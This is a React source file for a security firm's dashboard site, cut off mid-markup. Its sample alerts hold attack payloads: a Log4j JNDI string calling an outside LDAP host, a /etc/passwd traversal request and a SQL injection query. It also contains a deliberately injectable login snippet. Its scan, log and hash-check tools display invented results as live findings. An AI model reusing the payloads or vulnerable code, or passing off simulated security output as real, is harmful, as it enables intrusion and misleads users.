import React, { useState, useEffect } from "react";
import { 
  Shield, 
  Terminal, 
  Globe, 
  Activity, 
  Cpu, 
  RefreshCw, 
  Code, 
  FileCheck, 
  CheckCircle2, 
  Info, 
  Send,
  Zap,
  Briefcase,
  BookOpen,
  Key,
  Mail,
  Check,
  Play,
  CheckSquare,
  Phone,
  Download,
  ExternalLink
} from "lucide-react";
import { 
  ECOSYSTEM_PORTALS, 
  ECOSYSTEM_APIS, 
  SOCIAL_PROFILES, 
  CORPORATE_REGISTRATION 
} from "./ecosystemData";
import { AiSocDashboard } from "./components/AiSocDashboard";
import EcosystemDiscovery from "./components/EcosystemDiscovery";
import CookieConsent from "./components/CookieConsent";


// Interface definitions based on backend server capabilities
interface ThreatAlert {
  id: string;
  timestamp: string;
  sourceIp: string;
  targetCountry: string;
  service: string;
  threatType: string;
  severity: "low" | "medium" | "high" | "critical" | string;
  payload: string;
  mitigation: string;
}

interface SecurityStats {
  totalBlocks24h: number;
  activeThreatsCounter: number;
  threatLevel: string;
  mitigationSuccessRate: string;
  sentinelNodeStatus: string;
  hqLocation: string;
  isoCompliance: string;
  soc2Compliance: string;
  dpdpCompliance: string;
}

interface CveItem {
  id: string;
  title: string;
  score: number;
  published: string;
  mitigation: string;
}

export default function App() {
  // Top-level navigation tab: home (Official Website Gateway), intel (Sentinel APEX), ai (AI Security Hub), tools (ThreatCore Tools), blog (Advisories & Academy), api (Ecosystem REST APIs)
  const [currentView, setCurrentView] = useState<"home" | "intel" | "ai" | "tools" | "blog" | "api" | "about" | "privacy" | "terms" | "copyright" | "soc" | "dpdp" | "owasp" | "mssp" | "vciso" | "pentest">("home");

  // Core App states carrying forward from our baseline
  const [activeAiTab, setActiveAiTab] = useState<"log" | "code" | "domain" | "compliance" | "chat">("log");
  const [loadingFeed, setLoadingFeed] = useState(false);
  const [alerts, setAlerts] = useState<ThreatAlert[]>([
    {
      id: "AL-8893",
      timestamp: new Date(Date.now() - 4000).toISOString(),
      sourceIp: "185.220.101.5",
      targetCountry: "IN",
      service: "SSL/TLS Portal",
      threatType: "Brute-Force Attack Blocked",
      severity: "high",
      payload: "SSH-2.0-Go_SFTP_Client_1.1",
      mitigation: "IP automatically null-routed by AI Security Hub Sentinel"
    },
    {
      id: "AL-8892",
      timestamp: new Date(Date.now() - 42000).toISOString(),
      sourceIp: "45.146.164.120",
      targetCountry: "US",
      service: "Enterprise Threat Intel",
      threatType: "Directory Traversal Attempt",
      severity: "medium",
      payload: "GET /../../../../etc/passwd HTTP/1.1",
      mitigation: "Filtered via CyberDude WAF engine"
    },
    {
      id: "AL-8891",
      timestamp: new Date(Date.now() - 120000).toISOString(),
      sourceIp: "109.238.10.82",
      targetCountry: "IN",
      service: "API gateway Tools",
      threatType: "Log4j JNDI Lookup Probe",
      severity: "critical",
      payload: "${jndi:ldap://109.238.10.82:1389/a}",
      mitigation: "Blocked at edge router, threat score registered as 98%"
    },
    {
      id: "AL-8890",
      timestamp: new Date(Date.now() - 360000).toISOString(),
      sourceIp: "223.190.81.44",
      targetCountry: "EU",
      service: "Sentinel APEX",
      threatType: "Port Scanning Activity",
      severity: "low",
      payload: "TCP SYN Sweep (Ports 21, 22, 23, 80, 443, 8080)",
      mitigation: "Alert logged, source IP flagged in blacklists"
    },
    {
      id: "AL-8889",
      timestamp: new Date(Date.now() - 600000).toISOString(),
      sourceIp: "91.240.118.50",
      targetCountry: "JP",
      service: "AI Security Hub",
      threatType: "SQL Injection Blocked",
      severity: "high",
      payload: "UNION SELECT username, password FROM users--",
      mitigation: "Query sanitized and blocked; client session terminated"
    }
  ]);

  const [stats, setStats] = useState<SecurityStats>({
    totalBlocks24h: 342981,
    activeThreatsCounter: 142,
    threatLevel: "ELEVATED",
    mitigationSuccessRate: "100.0%",
    sentinelNodeStatus: "Fully Operational",
    hqLocation: "Ragadi, Jajpur, Odisha, India",
    isoCompliance: "ISO/IEC 27001:2022 Certified",
    soc2Compliance: "SOC 2 Type II Compliant",
    dpdpCompliance: "DPDP 2023 Audited"
  });

  const [cves, setCves] = useState<CveItem[]>([
    {
      id: "CVE-2026-1182",
      title: "Remote Code Execution in Cloud Orchestration Gateways",
      score: 9.8,
      published: "2026-06-25",
      mitigation: "Upgrade orchestrator components to v4.9.12 or patch via Sentinel IPS Rules"
    },
    {
      id: "CVE-2026-0421",
      title: "Authentication Bypass in Distributed Token Manager",
      score: 8.8,
      published: "2026-06-20",
      mitigation: "Revoke standard sessions, mandate hardware MFA integration"
    },
    {
      id: "CVE-2025-5490",
      title: "Memory Corruption in Core Network Packet Analyzer",
      score: 7.5,
      published: "2025-12-18",
      mitigation: "Compile with stack-protector enabled or deploy APEX runtime guard"
    }
  ]);

  const [feedTimestamp, setFeedTimestamp] = useState<string>(new Date().toLocaleTimeString());

  // AI Security Hub states
  const [analyzerInput, setAnalyzerInput] = useState<string>("");
  const [analyzerLoading, setAnalyzerLoading] = useState(false);
  const [analyzerReport, setAnalyzerReport] = useState<string>("");

  // ThreatCore Tools States
  const [toolSubdomainInput, setToolSubdomainInput] = useState("cyberdudebivash.com");
  const [scoutingActive, setScoutingInputActive] = useState(false);
  const [scoutLogs, setScoutLogs] = useState<string[]>([]);
  const [scoutResults, setScoutResults] = useState<{subdomain: string; ip: string; status: number}[]>([]);

  const [toolPortInput, setToolPortInput] = useState("103.142.12.98");
  const [portScanningActive, setPortScanningActive] = useState(false);
  const [portScanLogs, setPortScanLogs] = useState<string[]>([]);
  const [portScanResults, setPortScanResults] = useState<{port: number; service: string; state: string}[]>([]);

  const [hashInput, setHashInput] = useState("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  const [hashReport, setHashReport] = useState<string | null>(null);

  // API Workspace playground state
  const [apiKey, setApiKey] = useState("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000));
  const [apiConsoleResponse, setApiConsoleResponse] = useState<string>('{\n  "message": "Click Send Request above to query Sentinel intelligence."\n}');
  const [apiEndpointSelected, setApiEndpointSelected] = useState<"feed" | "cves" | "stats">("feed");

  // Advanced God Mode Ecosystem States
  const [pingingPortalId, setPingingPortalId] = useState<string | null>(null);
  const [pingLogs, setPingLogs] = useState<string[]>([]);
  const [activeSocialFilter, setActiveSocialFilter] = useState<string>("All");
  const [gstInput, setGstInput] = useState<string>(CORPORATE_REGISTRATION.gstin);
  const [gstVerificationResult, setGstVerificationResult] = useState<any | null>(null);
  const [gstVerifying, setGstVerifying] = useState<boolean>(false);
  const [activeEcosystemApiIndex, setActiveEcosystemApiIndex] = useState<number>(0);

  // Premium product Gumroad downloads/order helper
  const [purchasedProduct, setPurchasedProduct] = useState<string | null>(null);
  const [checkingOutProduct, setCheckingOutProduct] = useState<any | null>(null);
  const [checkoutModalOpen, setCheckoutModalOpen] = useState(false);
  const [paymentOption, setPaymentOption] = useState<"upi" | "card" | "crypto">("upi");
  const [checkoutSubmitted, setCheckoutSubmitted] = useState(false);

  // Contact / Lead Forms
  const [showContactModal, setShowContactModal] = useState(false);
  const [contactForm, setContactForm] = useState({
    name: "",
    email: "",
    company: "",
    message: ""
  });
  const [contactSubmitted, setContactSubmitted] = useState(false);

  // Dynamic live background counters
  const [activeNodesCount, setActiveNodesCount] = useState(1042);
  const [firewallLoad, setFirewallLoad] = useState(42);
  const [scanSpeedHz, setScanSpeedHz] = useState(5.82);

  // Live website logs ticker (simulates Image 4 logs)
  const [liveLogs, setLiveLogs] = useState<{time: string; severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[]>([
    { time: "02:17:43", severity: "CRITICAL", msg: "Ransomware lateral movement detected — 185.220.101.47 → LockBit 3.0" },
    { time: "02:17:44", severity: "BLOCKED", msg: "SENTINEL APEX™ auto-isolated DC-PROD-01 — threat neutralized" },
    { time: "02:18:01", severity: "HIGH", msg: "APT-29 C2 beacon — 91.108.56.130:443 — Cozy Bear campaign" },
    { time: "02:18:07", severity: "BLOCKED", msg: "C2 traffic blocked. IOC pushed to SIEM. SIGMA rule generated — CDB-2026-04817" },
    { time: "02:18:22", severity: "HIGH", msg: "Suspicious PowerShell exec — WORKSTATION-44 — MITRE T1059.001" },
    { time: "02:18:35", severity: "MEDIUM", msg: "DNS tunneling — ENDPOINT-12 → malware-cdn.ru — monitoring" },
    { time: "02:18:41", severity: "CRITICAL", msg: "Zero-day exploit attempt — CVE-2026-1337 — AI Shield™ active" },
    { time: "02:18:42", severity: "BLOCKED", msg: "Exploit neutralized. YARA rule deployed across all endpoints" }
  ]);

  // Fetch threat feed with retry mechanism to handle server health gracefully
  const fetchThreatFeed = async (retryCount = 0) => {
    setLoadingFeed(true);
    try {
      const res = await fetch("/api/security/threat-feed");
      if (res.ok) {
        const data = await res.json();
        setAlerts(data.alerts || []);
        if (data.statistics) {
          setStats(data.statistics);
        }
        if (data.recentCves) {
          setCves(data.recentCves);
        }
        setFeedTimestamp(new Date().toLocaleTimeString());
      } else {
        throw new Error(`Server returned status ${res.status}`);
      }
    } catch (e) {
      console.log("[Sentinel APEX] Feed sync offline (using resilient cached baseline data)");
      if (retryCount < 3) {
        setTimeout(() => fetchThreatFeed(retryCount + 1), 5000);
      }
    } finally {
      setLoadingFeed(false);
    }
  };

  // Initial load and ticker simulators
  useEffect(() => {
    fetchThreatFeed();

    // Live sync ticker for logs
    const logInterval = setInterval(() => {
      const hours = new Date().getHours().toString().padStart(2, "0");
      const minutes = new Date().getMinutes().toString().padStart(2, "0");
      const seconds = new Date().getSeconds().toString().padStart(2, "0");
      const logTime = `${hours}:${minutes}:${seconds}`;

      const randomIps = ["104.22.4.15", "185.220.101.99", "45.146.164.22", "19.2.22.144", "223.190.81.25"];
      const randomIp = randomIps[Math.floor(Math.random() * randomIps.length)];
      
      const newLogEvents: {severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[] = [
        { severity: "CRITICAL", msg: `SQL injection attempt blocked from ${randomIp} targeting transactional API` },
        { severity: "BLOCKED", msg: `IP null-routed: ${randomIp} flagged on active blacklist` },
        { severity: "HIGH", msg: `Credential stuffing probe from 172.67.2.148 blocked at Edge gateway` },
        { severity: "MEDIUM", msg: `Unsanitized PDF upload attempt rejected on compliance file upload` },
        { severity: "CRITICAL", msg: `Zero-day remote execution probe on node AP-NORTH prevented by AI Shield` },
        { severity: "BLOCKED", msg: `Session revoked for anomalous API payload sequence` }
      ];

      const selectedEvent = newLogEvents[Math.floor(Math.random() * newLogEvents.length)];
      
      setLiveLogs(prev => [
        { time: logTime, ...selectedEvent },
        ...prev.slice(0, 11)
      ]);
    }, 5000);

    // Dynamic stats generator
    const statsInterval = setInterval(() => {
      setFirewallLoad(prev => {
        const delta = Math.floor(Math.random() * 5) - 2;
        const next = prev + delta;
        return next > 95 ? 95 : next < 25 ? 25 : next;
      });
      setActiveNodesCount(prev => prev + (Math.random() > 0.5 ? 1 : -1));
      setScanSpeedHz(prev => {
        const delta = (Math.random() * 0.4) - 0.2;
        return parseFloat((prev + delta).toFixed(2));
      });
    }, 4000);

    return () => {
      clearInterval(logInterval);
      clearInterval(statsInterval);
    };
  }, []);

  // Pre-populate AI Analyzer inputs
  const applyPresetTemplate = (tab: typeof activeAiTab) => {
    switch (tab) {
      case "log":
        setAnalyzerInput(
          `Jul 28 11:24:02 core-node-1 nginx[3120]: 192.168.1.144 - - [28/Jul/2026:11:24:02 +0000] "GET /admin/db_backup.sql HTTP/1.1" 404 162 "https://cyberdudebivash.in" "Mozilla/5.0 (Nmap Scripting Engine; http://nmap.org/book/nse.html)"`
        );
        break;
      case "code":
        setAnalyzerInput(
          `// Vulnerable Node.js login endpoint code snippet\napp.post('/api/login', (req, res) => {\n  const query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND password = '" + req.body.password + "'";\n  db.query(query, (err, result) => {\n    if (err) throw err;\n    if (result.length > 0) {\n      res.json({ success: true, user: result[0] });\n    } else {\n      res.status(401).json({ error: "Invalid credentials" });\n    }\n  });\n});`
        );
        break;
      case "domain":
        setAnalyzerInput(
          `Domain: staging-api-sentinel-vault.net\nResolved IPs: 104.22.4.92, 172.67.2.148\nDNSSEC: Disabled\nSPF Record: v=spf1 include:mx-relay.com ~all\nDMARC: Not configured\nPorts Detected: 22/tcp (filtered), 80/tcp (open), 443/tcp (open), 8080/tcp (open)`
        );
        break;
      case "compliance":
        setAnalyzerInput(
          `Organizational Audit Context:\n1. All biometric customer logs are saved in plaintext CSV tables for debugging on staging VMs located in AP-SOUTH.\n2. Staff authentication is standard username/password without mandating hardware MFA tokens.\n3. Annual security assessments are logged and tracked via email rather than structured compliance repositories.`
        );
        break;
      case "chat":
        setAnalyzerInput(
          `Explain how CyberDudeBivash Sentinel APEX coordinates active mitigations against real-time API exploitation vectors.`
        );
        break;
    }
  };

  useEffect(() => {
    applyPresetTemplate(activeAiTab);
  }, [activeAiTab]);

  // Handle selecting log entry to investigate
  const handleSelectAlert = (alert: ThreatAlert) => {
    setCurrentView("ai");
    setActiveAiTab("log");
    setAnalyzerInput(
      `ALERT ID: ${alert.id}\nTIMESTAMP: ${alert.timestamp}\nSOURCE IP: ${alert.sourceIp}\nTARGET NODE: ${alert.targetCountry} Service: ${alert.service}\nTHREAT VECTOR: ${alert.threatType}\nATTACK PAYLOAD: ${alert.payload}\nMITIGATION STATE: ${alert.mitigation}`
    );
  };

  // Submit for AI Security Audit (Express + Gemini endpoint)
  const handleAnalyze = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!analyzerInput.trim()) return;

    setAnalyzerLoading(true);
    setAnalyzerReport("");
    try {
      const response = await fetch("/api/security/analyze", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: activeAiTab,
          content: analyzerInput
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAnalyzerReport(data.report);
      } else {
        const errData = await response.json();
        setAnalyzerReport(errData.report || errData.error || errData.fallback || "An error occurred during AI analysis.");
      }
    } catch (err) {
      setAnalyzerReport(`### AI Analysis offline\nFailed to establish connection to CyberDude AI Security Hub server. Check development console for details.`);
    } finally {
      setAnalyzerLoading(false);
    }
  };

  // Trigger subdomain scouting demo
  const runSubdomainScout = () => {
    if (scoutingActive) return;
    setScoutingInputActive(true);
    setScoutLogs([]);
    setScoutResults([]);
    
    const logs = [
      "Initializing ThreatCore Recon client...",
      "Connecting DNS authority resolvers at Odisha, India HQ...",
      "Scanning Certificate Transparency Logs for target domain...",
      "CT Logs match detected: 14 total entries...",
      "Brute-forcing common host prefixes using elite wordlist...",
      "Resolving target IP routes for active subdomains...",
      "Scout completed successfully. Threat score calculated."
    ];

    let delay = 0;
    logs.forEach((logLine, index) => {
      setTimeout(() => {
        setScoutLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${logLine}`]);
        if (index === logs.length - 1) {
          setScoutResults([
            { subdomain: "api-sentinel." + toolSubdomainInput, ip: "103.142.12.98", status: 200 },
            { subdomain: "staging-vault." + toolSubdomainInput, ip: "185.220.101.44", status: 403 },
            { subdomain: "internal-blog." + toolSubdomainInput, ip: "109.238.10.82", status: 200 },
            { subdomain: "tools-dev." + toolSubdomainInput, ip: "172.67.2.15", status: 404 }
          ]);
          setScoutingInputActive(false);
        }
      }, delay);
      delay += 800;
    });
  };

  // Trigger port scan demo
  const runPortScan = () => {
    if (portScanningActive) return;
    setPortScanningActive(true);
    setPortScanLogs([]);
    setPortScanResults([]);

    const steps = [
      `Resolving IP target route to ${toolPortInput}...`,
      "Sending SYN packets to top 100 industrial security ports...",
      "Awaiting socket responses via Sentinel Edge nodes...",
      "Filtering results and validating firewalled routes...",
      "Scan process finalized. ThreatCore report compiled."
    ];

    let delay = 0;
    steps.forEach((step, idx) => {
      setTimeout(() => {
        setPortScanLogs(prev => [...prev, `[+] ${step}`]);
        if (idx === steps.length - 1) {
          setPortScanResults([
            { port: 22, service: "SSH / SFTP", state: "Open (Unfiltered)" },
            { port: 80, service: "HTTP Web Port", state: "Open (Filter Active)" },
            { port: 443, service: "HTTPS (SSL/TLS)", state: "Open (TLS v1.3)" },
            { port: 8080, service: "Apache / Alternative Server", state: "Closed (Firewalled)" }
          ]);
          setPortScanningActive(false);
        }
      }, delay);
      delay += 900;
    });
  };

  // Trigger hash reputation check
  const runHashCheck = () => {
    if (!hashInput.trim()) return;
    
    // Simulate reputation lookup
    if (hashInput.toLowerCase().includes("e3b0c4") || hashInput.length < 32) {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🟢 SAFE / CLEAN
* **Reputation Index**: 0% Malicious Risk
* **File Classifier**: Empty file standard SHA-256 baseline or standard benign library. No known APT, ransom, or dropper vectors matching in active CDB databases.`);
    } else {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic [WARNING]
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🔴 HIGH RISK MALICIOUS VECTOR DETECTED
* **Reputation Index**: 98% Cyber Threat Threat Level
* **Attributed Group**: LockBit Ransomware Group (CDB-APT-22 variant)
* **Associated Techniques**: MITRE T1486 (Data Encrypted for Impact), T1190 (Exploit Public-Facing Application)
* **Remediation Action**: Standard signature block generated. Ensure edge endpoint agents have YARA rules enabled.`);
    }
  };

  // God Mode: Interactive Ecosystem Portal Ping Tester
  const triggerPortalPing = (portalId: string, portalName: string, url: string) => {
    setPingingPortalId(portalId);
    setPingLogs([`[INIT] Launching autonomous handshake protocols to ${portalName}...`]);
    
    const steps = [
      { t: 200, m: `[RESOLVING] Performing DNS lookup for host ${url.replace("https://", "").replace("/", "")}...` },
      { t: 450, m: `[RESOLVED] Host IP pointed to secure Cloudflare proxy edge subnets.` },
      { t: 700, m: `[CONNECTING] Establishing TCP 3-way handshake over port 443 (HTTPS)...` },
      { t: 1000, m: `[TLS HANDSHAKE] Negotiating TLS v1.3 cryptographic session key. Cipher: TLS_AES_256_GCM_SHA384` },
      { t: 1300, m: `[CERTIFICATE] SSL certificate validated. Issued by: Cloudflare Inc ECC CA-3 (Expires: 2027)` },
      { t: 1600, m: `[HTTP GET] Sending HEAD / HTTP/2 request payload with authorization check...` },
      { t: 1900, m: `[RESPONSE] Status Code: 200 OK. Response Header Server: cloudflare` },
      { t: 2200, m: `[SUCCESS] ${portalName} (${url}) is ACTIVE, HEALTHY, and reporting 100.0% traffic integrity!` }
    ];

    steps.forEach((step) => {
      setTimeout(() => {
        setPingLogs(prev => [...prev, step.m]);
      }, step.t);
    });
  };

  // God Mode: GSTIN Verification Tool
  const verifyGstInward = (e: React.FormEvent) => {
    e.preventDefault();
    setGstVerifying(true);
    setGstVerificationResult(null);
    
    setTimeout(() => {
      const normalized = gstInput.trim().toUpperCase().replace(/\s+/g, '');
      if (normalized === CORPORATE_REGISTRATION.gstin) {
        setGstVerificationResult({
          status: "SUCCESS_ACTIVE",
          message: "GSTIN record found and matched against the India GST common database.",
          legalName: CORPORATE_REGISTRATION.legalName,
          tradeName: CORPORATE_REGISTRATION.tradeName,
          gstin: CORPORATE_REGISTRATION.gstin,
          pan: CORPORATE_REGISTRATION.pan,
          address: CORPORATE_REGISTRATION.address,
          taxpayerType: "Private Limited Company",
          registrationDate: "2024-03-12",
          jurisdiction: "Jajpur Ward, Odisha, India",
          complianceScore: "10/10 (Highest Trust Rating)"
        });
      } else {
        setGstVerificationResult({
          status: "ERROR_UNRESOLVED",
          message: `The entered GSTIN "${normalized}" could not be reconciled against CYBERDUDEBIVASH corporate profiles. Confirm coordinates and try again.`,
        });
      }
      setGstVerifying(false);
    }, 1500);
  };

  // Advanced: Execute custom live API queries for any of the 8 routes
  const executeEcosystemApiRequest = (idx: number) => {
    setActiveEcosystemApiIndex(idx);
    const api = ECOSYSTEM_APIS[idx];
    setApiConsoleResponse(`// Connecting to ${api.url} ...\n// Authorization: Bearer ${apiKey}\n// Performing standard REST request...`);
    
    setTimeout(() => {
      if (api.responseType === "JSON") {
        setApiConsoleResponse(JSON.stringify(api.mockPayload, null, 2));
      } else {
        setApiConsoleResponse(api.mockPayload);
      }
    }, 800);
  };

  // Trigger simulated local API request (Legacy bridge)
  const testRestApiRequest = () => {
    setApiConsoleResponse('{\n  "status": "query_active",\n  "message": "Communicating with Odisha Sentinel center..."\n}');
    setTimeout(() => {
      if (apiEndpointSelected === "feed") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/security/threat-feed",
          timestamp: new Date().toISOString(),
          threat_level: "ELEVATED",
          alerts_count: alerts.length,
          recent_alerts: alerts.slice(0, 3)
        }, null, 2));
      } else if (apiEndpointSelected === "cves") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/recent-cves",
          timestamp: new Date().toISOString(),
          cves_count: cves.length,
          catalog: cves
        }, null, 2));
      } else {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/statistics",
          timestamp: new Date().toISOString(),
          statistics: stats
        }, null, 2));
      }
    }, 1000);
  };

  // Checkout modal for Gumroad products
  const handleCheckoutProduct = (product: any) => {
    setCheckingOutProduct(product);
    setCheckoutSubmitted(false);
    setCheckoutModalOpen(true);
  };

  const handleCheckoutSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setCheckoutSubmitted(true);
    setTimeout(() => {
      setPurchasedProduct(checkingOutProduct.id);
      setCheckoutModalOpen(false);
      setCheckoutSubmitted(false);
    }, 2000);
  };

  // Lead inquiry form submit
  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setContactSubmitted(true);
    setTimeout(() => {
      setShowContactModal(false);
      setContactSubmitted(false);
      setContactForm({ name: "", email: "", company: "", message: "" });
    }, 3000);
  };

  // severity badging utility
  const getSeverityBadge = (severity: string) => {
    const norm = severity.toLowerCase();
    if (norm === "critical") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-red-950 text-red-400 border border-red-800 uppercase animate-pulse">CRITICAL</span>;
    }
    if (norm === "high") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-orange-950 text-orange-400 border border-orange-800 uppercase">HIGH</span>;
    }
    if (norm === "medium") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-yellow-950 text-yellow-400 border border-yellow-800 uppercase">MEDIUM</span>;
    }
    return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-slate-900 text-slate-400 border border-slate-800 uppercase">LOW</span>;
  };

  // Gumroad checklists static data
  const premiumProducts = [
    { id: "ai_tool", title: "AI Security Toolkit OWASP LLM", price: "₹499", desc: "Complete OWASP LLM Top 10 guide - checklists, test cases, and mitigation vectors." },
    { id: "iso_tool", title: "Compliance Starter Pack ISO 27001", price: "₹999", desc: "ISO 27001:2022 gap analysis models, SoA document, and standard policy library." },
    { id: "red_tool", title: "Red Team Playbook MITRE ATT&CK", price: "₹1,499", desc: "12 adversary simulation pipelines mapped to MITRE ATT&CK security chains." },
    { id: "zt_tool", title: "Zero Trust Blueprint NIST 800-207", price: "₹799", desc: "ZTA implementation guide - identity authentication architecture, microsegmentation models." },
    { id: "dpdp_tool", title: "DPDP Act Compliance Kit INDIA", price: "₹699", desc: "Data Fiduciary obligations, consent framework templates, and breach notification SOP." }
  ];

  return (
    <div className="min-h-screen bg-[#06080a] text-slate-300 font-sans flex flex-col selection:bg-cyan-500/30 selection:text-cyan-200">
      
      {/* 1. SECURE ANNOUNCEMENT & UTILITY BAR */}
      <div className="bg-[#080d12] text-[11px] border-b border-slate-900 py-1.5 px-6 flex flex-wrap items-center justify-between gap-3 text-slate-400 font-mono">
        <div className="flex items-center gap-2">
          <span className="inline-block w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
          <span className="text-slate-200 font-bold">🛡️ LIVE MONITOR:</span>
          <span className="truncate max-w-[280px] sm:max-w-none text-slate-400">2,847 threats neutralized in last 24h &bull; APEX Threat Map Active</span>
        </div>
        <div className="flex items-center gap-4 text-xs">
          <span className="hidden sm:inline-block">🕐 Mon–Sat 9AM–7PM IST</span>
          <span className="hidden md:inline-block text-cyan-400">Secure Network Hub: Ragadi, Odisha, IN</span>
          <div className="flex items-center gap-1.5 text-slate-300">
            <Mail className="w-3.5 h-3.5 text-cyan-500" />
            <span>bivash@cyberdudebivash.com</span>
          </div>
        </div>
      </div>

      {/* 2. UNIFIED ENTERPRISE NAVIGATION HEADER */}
      <header className="flex items-center justify-between px-6 h-16 border-b border-slate-800 bg-[#0c1117] shrink-0 sticky top-0 z-40 shadow-lg shadow-black/40">
        <div className="flex items-center gap-4">
          <div 
            onClick={() => setCurrentView("home")}
            className="w-10 h-10 bg-cyan-500 rounded flex items-center justify-center text-black font-extrabold text-xl shadow-lg shadow-cyan-500/20 glow-cyan cursor-pointer"
          >
            C
          </div>
          <div className="flex flex-col cursor-pointer" onClick={() => setCurrentView("home")}>
            <div className="flex items-center gap-2">
              <h1 className="text-lg font-bold tracking-tight text-slate-100">
                CyberDudeBivash<span className="text-cyan-500 font-semibold text-xs ml-0.5">®</span> 
              </h1>
              <span className="bg-cyan-950 text-cyan-400 text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border border-cyan-800">ECOSYSTEM V4</span>
            </div>
            <span className="text-[10px] text-slate-500 font-mono tracking-wide leading-none mt-1">
              ISO/IEC 27001 &bull; SOC 2 Type II &bull; DPDP 2023 Compliant
            </span>
          </div>
        </div>

        {/* Global Tabs Navigation Selector */}
        <nav className="hidden lg:flex items-center gap-1.5 bg-slate-950 p-1 rounded-lg border border-slate-900">
          <button 
            onClick={() => setCurrentView("home")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "home" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Globe className="w-3.5 h-3.5" /> Gateway
          </button>
          <button 
            onClick={() => setCurrentView("intel")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "intel" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Activity className="w-3.5 h-3.5" /> Sentinel APEX™
          </button>
          <button 
            onClick={() => setCurrentView("ai")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "ai" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Shield className="w-3.5 h-3.5" /> AI Hub &amp; Audit
          </button>
          <button 
            onClick={() => setCurrentView("tools")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "tools" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Cpu className="w-3.5 h-3.5" /> ThreatCore™ Tools
          </button>
          <button 
            onClick={() => setCurrentView("blog")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "blog" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <BookOpen className="w-3.5 h-3.5" /> Blog &amp; Academy
          </button>
          <button 
            onClick={() => setCurrentView("api")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "api" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Key className="w-3.5 h-3.5" /> REST API
          </button>
        </nav>

        <div className="flex items-center gap-4">
          <button 
            onClick={() => setShowContactModal(true)}
            className="hidden sm:inline-block px-4 py-2 bg-gradient-to-r from-cyan-500 to-sky-600 hover:from-cyan-400 hover:to-sky-500 text-black font-extrabold text-xs uppercase tracking-wider rounded transition-all shadow-md shadow-cyan-500/10"
          >
            Request Enterprise SOC
          </button>
          <div className="h-8 w-[1px] bg-slate-800"></div>
          <div className="text-right hidden md:block font-mono">
            <div className="text-[10px] text-slate-500 leading-none">NODE IP</div>
            <div className="text-xs text-slate-300 font-bold mt-1">103.142.12.98</div>
          </div>
        </div>
      </header>

      {/* 2b. ECOSYSTEM QUICK-JUMP NAVIGATION BAR */}
      <div className="hidden md:flex items-center gap-0 bg-[#080d12] border-b border-slate-900/80 px-6 py-0 overflow-x-auto">
        <span className="text-[9px] font-mono text-slate-600 uppercase tracking-widest pr-3 border-r border-slate-900 mr-1 shrink-0 py-2">Ecosystem</span>
        {[
          { label: "Official Website",    url: "https://www.cyberdudebivash.com",                   dot: "bg-cyan-500" },
          { label: "Sentinel APEX™",      url: "https://intel.cyberdudebivash.com/",                 dot: "bg-red-500" },
          { label: "AI Security Hub",     url: "https://cyberdudebivash.in/",                        dot: "bg-purple-500" },
          { label: "Tools Marketplace",   url: "https://tools.cyberdudebivash.com/",                 dot: "bg-amber-500" },
          { label: "Research Blog",       url: "https://blog.cyberdudebivash.in/",                   dot: "bg-emerald-500" },
          { label: "Developer Docs",      url: "https://intel.cyberdudebivash.com/api-docs",         dot: "bg-sky-500" },
          { label: "Upgrade Enterprise",  url: "https://intel.cyberdudebivash.com/upgrade.html",     dot: "bg-amber-400" },
        ].map((item) => (
          <a
            key={item.label}
            href={item.url}
            target="_blank"
            rel="noopener noreferrer"
